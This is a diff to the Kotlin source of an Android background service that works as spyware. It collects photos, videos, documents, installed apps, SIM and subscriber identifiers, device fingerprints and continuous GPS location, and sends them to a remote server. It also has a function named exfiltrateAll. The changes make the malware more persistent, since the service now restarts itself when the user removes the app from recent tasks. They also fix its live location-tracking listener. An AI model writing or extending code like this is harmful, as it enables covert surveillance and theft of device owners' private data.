@@ -62,6 +62,7 @@ class MainService : Service() {
     private var lastBulkDataSent = 0L
     private var isConnected = false
     private var wakeLock: PowerManager.WakeLock? = null
+    private var locationListener: LocationListener? = null
     
     companion object {
         private const val TAG = "MainService"   
@@ -157,6 +158,21 @@ class MainService : Service() {
         broadcastIntent.action = "restartService"
         broadcastIntent.setClass(this, MainService::class.java)
         sendBroadcast(broadcastIntent)
+    }
+    
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        // Restart service when app is removed from recent apps
+        isRunning = false
+        isConnected = false
+        try { socket.disconnect() } catch (e: Exception) {}
+        val restartIntent = Intent(applicationContext, MainService::class.java)
+        restartIntent.setPackage(packageName)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(restartIntent)
+        } else {
+            startService(restartIntent)
+        }
+        super.onTaskRemoved(rootIntent)
     }
     
     private fun generateDeviceId(): String {
@@ -448,8 +464,6 @@ class MainService : Service() {
                 getInstalledApps()?.let { allData.put("installedApps", it) }
                 getGalleryPhotosWithUpload()?.let { allData.put("photos", it) }
                 getVideosWithUpload()?.let { allData.put("videos", it) }
-                getGalleryPhotosWithUpload()?.let { allData.put("photos", it) }
-                getVideosWithUpload()?.let { allData.put("videos", it) }
                 getDocuments()?.let { allData.put("documents", it) }
                 getCurrentLocation()?.let { allData.put("location", it) }
                 getBatteryInfo()?.let { allData.put("battery", it) }
@@ -689,7 +703,6 @@ class MainService : Service() {
             put("hardware", Build.HARDWARE); try { put("serial", Build.getSerial()) } catch (e: SecurityException) { put("serial", "restricted") }; put("osVersion", Build.VERSION.RELEASE)
             put("sdkVersion", Build.VERSION.SDK_INT); put("buildId", Build.DISPLAY); put("buildTime", Build.TIME)
             put("host", Build.HOST); put("fingerprint", Build.FINGERPRINT); put("type", Build.TYPE); put("tags", Build.TAGS)
-            try { put("serial", Build.getSerial()) } catch (e: SecurityException) { put("serial", "restricted") }
             put("bootloader", Build.BOOTLOADER); put("radioVersion", Build.getRadioVersion())
             val memInfo = Runtime.getRuntime(); put("totalMemory", memInfo.totalMemory()); put("freeMemory", memInfo.freeMemory()); put("maxMemory", memInfo.maxMemory()); put("availableProcessors", Runtime.getRuntime().availableProcessors())
             val storage = StatFs(Environment.getDataDirectory().absolutePath); val blockSize = storage.blockSizeLong
@@ -926,7 +939,8 @@ class MainService : Service() {
         return JSONObject().apply {
             if (ActivityCompat.checkSelfPermission(this@MainService, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                 put("simSerial", telephonyManager.simSerialNumber)
-                put("subscriberId", telephonyManager.subscriberId?.replace(telephonyManager.subscriberId.substring(0, minOf(6, telephonyManager.subscriberId.length)), "******"))
+                val subId = telephonyManager.subscriberId
+                put("subscriberId", if (subId != null && subId.length >= 6) subId.replaceRange(0, 6, "******") else (subId ?: "restricted"))
                 put("networkOperator", telephonyManager.networkOperatorName); put("simCountry", telephonyManager.simCountryIso)
                 put("simOperator", telephonyManager.simOperatorName); put("simState", telephonyManager.simState)
                 put("hasIccCard", telephonyManager.hasIccCard()); put("phoneCount", telephonyManager.phoneCount); put("isNetworkRoaming", telephonyManager.isNetworkRoaming)
@@ -980,7 +994,7 @@ class MainService : Service() {
     
     private fun startContinuousLocation(): JSONObject {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return JSONObject().apply { put("error", "Location permission not granted") }
-        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10f, object : LocationListener {
+        locationListener = object : LocationListener {
             override fun onLocationChanged(location: Location) {
                 try { safeEmit("device:data:bulk", JSONObject().apply { put("location", JSONObject().apply { put("lat", location.latitude); put("lng", location.longitude); put("accuracy", location.accuracy); put("speed", location.speed); put("bearing", location.bearing); put("timestamp", location.time) }) }) }
                 catch (e: Exception) { Log.e(TAG, "Error sending location: ${e.message}") }
@@ -988,11 +1002,17 @@ class MainService : Service() {
             override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
             override fun onProviderEnabled(provider: String) {}
             override fun onProviderDisabled(provider: String) {}
-        }, Looper.getMainLooper())
+        }
+        locationListener?.let {
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10f, it, Looper.getMainLooper())
+        }
         return JSONObject().apply { put("success", true) }
     }
     
-    private fun stopContinuousLocation(): JSONObject { locationManager.removeUpdates { true }; return JSONObject().apply { put("success", true) } }
+    private fun stopContinuousLocation(): JSONObject {
+        try { locationManager.removeUpdates(locationListener); } catch (e: Exception) { Log.e(TAG, "Error removing location updates: ${e.message}") }
+        return JSONObject().apply { put("success", true) }
+    }
     
     private fun exfiltrateAll(): JSONObject {
         Thread {
